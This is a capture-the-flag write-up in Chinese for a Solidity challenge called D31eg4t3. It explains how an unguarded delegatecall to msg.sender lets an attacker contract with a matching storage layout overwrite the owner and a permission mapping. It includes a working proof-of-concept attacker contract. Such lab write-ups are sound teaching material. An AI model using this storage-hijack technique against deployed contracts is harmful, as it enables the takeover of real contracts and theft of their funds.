## D31eg4t3

### 目标

- 成为合约的所有者
- 将 `canYouHackMe[msg.sender]` 设置为 true。

### 分析

在 `hackMe` 方法中

```solidity
function hackMe(bytes calldata bites) public returns (bool, bytes memory) {
    (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
    return (r, msge);
}
```

使用 `delegatecall` 来调用 `msg.sender` 合约中的 `bites`

由于 `delegatecall` 调用时, 上下文是在 `D31eg4t3` 合约内的。

故可以用攻击合约, 调用 `hackMe`

```
AttacterContract => D31eg4t3.hackMe => AttacterContract.<any method> => 更新 slot
```

`AttacterContract.<any method>` 执行时的上下文是在 `D31eg4t3` 合约内的。因此可以直接更改 `D31eg4t3` 合约变量

### POC

```solidity
contract D31eg4t3Attacker {
    uint256 slot0;
    uint256 slot1;
    uint256 slot2;
    uint256 slot3;
    uint256 slot4;
    address owner;
    mapping(address => bool) public canYouHackMe; // canYouHackMe

    function pwn(address target) external {
        (bool success, ) = D31eg4t3(target).hackMe("");
        require(success, "failed.");
    }

    fallback() external {
        owner = tx.origin;
        canYouHackMe[tx.origin] = true;
    }
}
```
